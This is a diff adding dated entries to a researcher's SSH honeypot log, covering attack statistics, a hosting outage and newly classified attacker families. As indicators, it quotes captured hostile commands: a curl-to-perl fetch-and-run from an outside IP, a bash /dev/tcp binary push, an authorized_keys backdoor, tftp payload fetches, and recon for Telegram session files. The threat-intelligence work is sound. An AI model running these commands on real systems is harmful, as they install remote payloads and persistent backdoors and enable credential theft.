@@ -515,3 +515,95 @@ Decision reasons, findings, bugs. Tagged-bullet format.
 - result: F10 ELF echo injector still the only real command driver -- echo is 99.5% of all commands and 99.5% of every recent day (~150-320k/day); no single mega-session this window, just steady daily dumps
 - fix(draft): first pass of the FINDINGS bullets was wrong twice -- called it "existing infrastructure hammering harder" (it's one new IP) and "not F10/echo, auth churn" (commands are still 99.5% F10); caught both on the verify pass, rewrote
 
+## 2026-07-19 pull -- 1304h, second single-IP root spike in a row
+
+- result(stats, 1304.5h, 2026-07-19.merged): 94548 auth attempts, 2218 source IPs, 91760 sessions accepted, 8321833 commands, 38533 unique passwords
+- result(delta Jul 16 -> Jul 19): auth +20280, IPs +57, sessions +20280, commands +563656, passwords +7937
+- cause: same shape as the Jul 14 spike -- 2026-07-18 had 19850 auth attempts vs ~230 every other day; one new IP drove the whole jump
+- ioc: 161.97.166.185 -- 19587 attempts, all user=root, 12:45-20:46 UTC (13:45-21:46 Rabat), ~8h straight, 9993 unique passwords, banner SSH-2.0-Go; never dropped to a shell so ~0 commands added; 0 hits in the Jul 16 data so genuinely new
+- note: two windows running now that the top-line doubling is one root-focused sprayer on a single day (Jul 14 = 165.227.238.235, Jul 18 = 161.97.166.185); different IPs, identical behavior -- the per-IP dominance line I wanted last time would've flagged both instantly
+- result: F10 ELF echo injector still the only real command driver -- echo 8281367 / 8320132 = 99.5% of the live period; no mega-session, steady daily dumps
+- did(docs): updated FINDINGS.md + README.md to 1304h, added the Jul16->Jul19 delta table and the second-spike narrative
+- did(tooling): ported report/stats/periods/timeline/sessions to streaming so they survive the 10G merged log -- all five run flat memory now (report 216MB, stats 67MB, periods 15MB, timeline 28MB, sessions 355MB), collapse the F10 echo chunks instead of holding every one; repointed pull_and_analyse.sh at this repo (was still pointing at the stale Jun-22 copy)
+
+## 2026-07-27 pull -- 1484h, quiet baseline window
+
+- cmd: python3 analysis/report.py ~/honeypot-logs/2026-07-27.merged/ --no-color (output result-0928--27-07-report.txt / -full-stats.txt)
+- result(stats, 1484.5h, 2026-07-27.merged): 97463 auth attempts, 2356 source IPs, 94675 sessions accepted, 9772217 commands, 40161 unique passwords
+- result(delta Jul 19 -> Jul 27): auth +2915, IPs +138, sessions +2915, commands +1450384, passwords +1628
+- note: quiet window for once -- no single-IP mega-spike like Jul 14 / Jul 18; +2915 auth spread at baseline (~360/day); the all-time top sprayers (165.227.238.235, 161.97.166.185) are carry-over, not new activity
+- result: F10 ELF echo injector still the only real command driver -- echo ~99.5% of all commands, +1.45M this window from steady daily dumps, no mega-session
+- did(docs): updated FINDINGS.md + README.md to 1484h, rolled Jul 19 into the previous-snapshot line, added the Jul19->Jul27 delta table; family count kept at 15 (no classify re-run this window)
+
+
+## 2026-07-29 -- Hetzner hel1 leaf fault mid-pull
+
+- context: Hetzner status page raised "Cloud Leaf fault hel1-cloud1-leaf9", status In progress, start 20:50 UTC (21:50 Rabat); affected systems listed as Cloud -- Load Balancer, Networks, Cloud Server, Object Storage, Cloud Volume
+- context: console flagged my instance in red with a (!) badge -- that's Hetzner marking the resource as sitting behind the faulted leaf, not a fault on the instance itself
+- cause(what a leaf fault actually is): the leaf is the switch layer a rack hangs off in a leaf-spine fabric; when it drops, everything reachable *through* it degrades while the instance's own CPU/RAM keep running -- the process never notices, inbound TCP to the honeypot port just stops arriving
+- result: honeypot untouched -- systemctl says active (running) since 2026-05-30 11:01:49 UTC, 1 month 29 days, same PID, same args (log-dir + quarantine-dir unchanged); no restart, so no new period boundary
+- did: ran pull_and_analyse.sh during the incident anyway -- scp pulled auth.log + every daily .gz at ~300KB/s, so the path from my machine was up; leaf was either partially degraded or already recovering
+- why(pulled now instead of waiting): Hetzner cloud disks are network-attached, which is why Volume and Object Storage are on the affected list -- a leaf fault can present as a disk stall, so I grabbed the logs while the path was healthy rather than find out later
+- did(rejected): restarting the service to "clear" it -- healthy daemon, and a restart would split periods.py for zero gain
+- watch: if inbound was dropped for any part of the window, 2026-07-29 auth/session counts dip for infrastructure reasons, not attacker behavior -- do not read that dip as a real drop in scanning, in the next report or in the blog post
+- todo: per-hour auth counts around 20:50 UTC onward in the fresh pull, to see whether there is actually a gap and how wide
+- note: first infra incident that touches the dataset instead of the code. Kind of a relief that the answer was "do nothing, the process is fine" -- but it means every long-run number I publish needs an uptime caveat somewhere, because the honeypot being up is not the same as the port being reachable.
+- result(gap check, done): 2026-07-29 per-hour auth -- 20:00 UTC hour 8 events, 21:00 UTC hour 1 (truncated, pull ran 21:11 UTC); real hole is 20:30:30 -> 21:11:39 UTC (21:30 -> 22:11 Rabat), 41 min
+- result: the one bot polling on a mechanical ~6.8 min beat (20:03/20:10/20:17/20:23/20:30) skipped ~6 consecutive beats and resumed at 21:11 -- best single piece of evidence the port went unreachable
+- watch(honest read): the gap starts 20 min BEFORE Hetzner's stated 20:50 start, and off-spike baseline is only ~10 events/h so 41 min of silence is ~6 missing events; consistent with the leaf fault, not proof of it -- Hetzner's "start" is when the ticket was raised, which usually trails onset
+- result: an event landed at 21:11 UTC, after the fault started, so reachability was back (or never fully lost) by then; dataset impact is minimal, the uptime caveat stands but it's small
+
+## 2026-08-23 -- pull to 2144h, sequence-grouping, three new families
+
+- did: pulled logs to 2026-08-23; window now 2026-05-26 11:32 -> 2026-08-23 19:31 UTC, 2144h (89.3 days)
+- result: 190862 auth attempts, 3069 IPs, 188073 sessions, 14325037 commands, 48077 unique passwords
+- did: wrote analysis/seqgroup.py -- groups sessions by exact command-sequence hash instead of rendering one block per session, folds echo runs at ingest so the ELF sessions never expand
+- result: 147097 sessions with >=1 command -> 2738 distinct sequences; 2611 are one-offs, only 50 sequences have 6+ sessions. Almost all traffic is a few bots repeating themselves byte-for-byte
+- ioc(F16 perl dropper): curl -sS 154.70.152.216/zed | perl -- 478 sessions, 186 IPs, first seen 2026-08-20, still live at pull. Pipes to perl not sh, backgrounded, then export HOME=/dev/null
+- ioc(F17 authorized_keys injector): ssh-rsa key comment `rsa-key-20250409` appended to /root/.ssh/authorized_keys, 52 sessions, 37 IPs, single burst 2026-08-17 15:16-19:29 Rabat, same key every time
+- ioc(F18 SSH key + scp): ed25519 private key written to key.ppk, scp from dlr@217.60.195.113 (earlier 14.46.136.77), key comment dlr@sftp; 375 sessions, IPs 130.12.180.51 / 77.90.185.20 / 45.148.10.68
+- result: F15 ok-beacon went 14954 -> 139336 sessions, 95% of every session that ran a command, still 8 IPs
+- note: what strikes me about August is all three new families avoid `wget | sh`. perl, scp, and just-install-a-key. If my detection was one grep for `| sh` I would have seen nothing this whole window.
+- todo: fetch/analyse 154.70.152.216/zed (perl, so readable source, not a binary -- easiest payload I have had yet)
+- todo: check whether the F17 RSA key shows up in any public scanner dataset -- reused since April 2025 means someone else has probably logged it
+- todo: rebuild the merged log properly (old merged + delta by CONTENT date, not filename) so the dedup guards stop being load-bearing
+- todo: screenshots for sections 16/17/18 -- replay renders are ready, placeholders say TODO-upload-screenshot
+- context: stopping here for tonight, will continue looking at this after. Nothing committed yet.
+
+## 2026-08-24 -- second pass, four more families out of the grouping
+
+- did: classified all 2738 sequences against known-family signatures instead of reading them; 143 unmatched, and the interesting ones were all buried below 20 sessions
+- result: F19 MikroTik/Telegram/SMS hunter, F20 busybox IoT probe, F21 dd + /dev/tcp binary push, plus F22/F23/F24 written as one combined recon-variants section
+- note: none of these are new traffic. They were in the logs the whole time. Ranking by session count hid them -- F19 is 6 sessions, F21 is 1. The grouping is what made them visible, not the pull.
+- ioc(F19): /ip cloud print + ls ~/.local/share/TelegramDesktop/tdata + locate D877F783D5D3EF8C + /dev/ttyGSM* /var/spool/sms/* /etc/smsd.conf* /usr/bin/qmuxd; IPs 64.226.126.224, 5.187.97.40, 80.249.151.39; client SSH-2.0-libssh2_1.11.0
+- ioc(F20): /bin/busybox TEST; IPs 31.77.227.120 (12 of 19), 93.89.113.60, 192.34.101.234, 35.187.231.181, 103.151.199.176, 80.225.238.77, 106.54.206.180
+- ioc(F21): bash /dev/tcp/172.100.0.1/60145, dd bs=1 count=1911588, UPX-packed ELF; IP 5.31.40.72, sid 45c6032c8ea9, client SSH-2.0-makiko, 2026-08-05 01:13 Rabat
+- ioc(F24): 213.232.114.14/handshakebins.sh + handshaketftp1.sh + handshaketftp2.sh over tftp; source 45.135.194.26; first seen 2026-08-23, pull day
+- bug(mine): my signature matcher missed c5f5d98fd1 -- that is F3 the SCP dropper, 11 dirs with random names via scp -t -r. Not a new family. Also a01501e1ee is the existing C16 ---SEP--- probe.
+- watch(F20 capture gap): busybox loader fingerprints by ERROR MESSAGE, not output. My fake shell answers plausibly but not the way real busybox answers, so stage two never gets sent. I can see it knocking and cannot catch it. Fixing that means emulating busybox error strings exactly -- decide if that is worth it.
+- note: F19 is the one that actually unsettles me. Everything else here wants my CPU. That one wants my Telegram session and a phone number to send SMS from. Different business entirely.
+- todo: decide on busybox error-string emulation for F20
+- todo: watch 213.232.114.14 (F24) on the next pull -- landed the day I pulled, no idea if it is a campaign
+- todo: F21 was one session. Check whether 5.31.40.72 or the dd+/dev/tcp pattern comes back
+- context: 22 sections in FINDINGS.md now. Still nothing committed.
+
+## 2026-09-29 -- full merge to 3019h, three new families, disk cleanup
+
+- did: built 2026-09-29.full -- mv'd 2026-08-23.merged in place + appended 2026-09-29.pull delta by CONTENT date (gz named D hold day D-1); straddle day Aug23 filtered to time > merged-tail boundary (session 19:31:36, auth 19:25:33 UTC)
+- why: dated gz before Jun25 are rotated away so a clean rebuild from gz is impossible -> delta-append onto the old merged instead; .full is the base now, future pulls append their new gz onto it
+- result(2026-09-29.full): 26G, 2026-05-26 11:37 -> 2026-09-29 06:33 UTC, both seams verified (boundary line appears once, no gap); server.log 9 listens deduped
+- cmd: python3 analysis/gen_stats.py ~/honeypot-logs/2026-09-29.full   (regens STATS.md, the source of truth)
+- result(STATS.md, gen_stats, 3019h): 225871 auth, 6631 IPs, 50305 passwords, 223082 sessions, 19462122 commands, 53757 pairs, 2737 usernames, 61 payloads / 59 quarantined
+- result(delta Aug23 -> Sep29, gen_stats): auth +35009, IPs +3562 (doubled), passwords +2228, sessions +35009, commands +5137085
+- bug(watch): raw stats.py / quick-report read 237173 auth + 19737887 cmds -- they do NOT apply gen_stats' dedup (11302 auth / 284291 session dups baked into the old merged). quoted the gen_stats numbers in FINDINGS/README since STATS.md is the declared source of truth; had to redo the header + delta table once gen_stats ran
+- did: seqgroup on .full (168182 sess with cmds -> 6471 distinct seqs, 303980 dup records dropped); classified post-Aug23 clusters vs F1-F22
+- result: 3 new families -- F23 astats/kstats rival-killer (973718910a, kills F6's procs + find-deletes astats/s.lock/kstats, first cross-family aggression in the dataset); F24 paramiko host-profiler (a59df21088, goole.com typo canary + auth.log/ss ESTAB inventory); F25 paramiko capability probe (7e05f81f30, os-release/nproc/free/sudo -n whoami)
+- result(known-family evolutions): F10 rotated primary C2 to 194.59.30-31.x / 151.241.154.172 (11 host:port), 45.88.91.135:35146 still the constant mirror, 195.177.94.72 gone this window; F18 (130.12.180.51 / 77.90.185.20) now prepends the F5 auth_ok beacon before the key drop, 47 sess through pull day; C16 ---SEP--- 269-sess burst from 157.10.198.167 in a 50min window Sep 15
+- note: IP count doubled but it is churn -- only 3 new families in 3733 new sequence shapes. the dataset is getting wider, not deeper. say that in the blog post before I draw a top-families chart
+- ioc: 45.88.91.135:35146 (F10 anchor mirror); goole.com (F24 canary); 157.10.198.167 (C16 burst); 130.12.180.51 + 77.90.185.20 (F18)
+- did(docs): FINDINGS.md -- 3019h header, What-changed Aug23->Sep29 section, families 23/24/25, C2 table F10 Sep row; README.md -- headline stats, latest-pull para, seqgroup counts; section count 22 -> 25
+- watch(numbering): my section count is 25 but gen_stats "classified families" is 23 (family_mapping.json has no F23/24/25 yet) and the F-number scheme already reached F24 (section 22 bundles F22-F24). the headline family number needs a reconcile + the mapping needs the 3 new sigs
+- todo: 3 replay screenshots for families 23/24/25 (sids 4cf2f2052925, 10d744023c51, e82530e9a9cc), replace the TODO-upload-screenshot lines
+- did(disk): deleted 2026-07-29.merged + 2026-09-29.merged (26G, both redundant -- content in .full, raw gz in the .pull dirs which cover May26->Sep29); npm cache clean (7.4G -> 704M); removed old result-*.txt (kept 29-09 + 05-10). ~33G freed inside WSL
+- todo(disk): compact the WSL vhdx from Windows to hand the ~33G back to C: -- wsl --shutdown; wsl --manage <distro> --set-sparse true
+- watch: .full is the only uncompressed copy now; the three .pull dirs are the raw backup, do not delete them
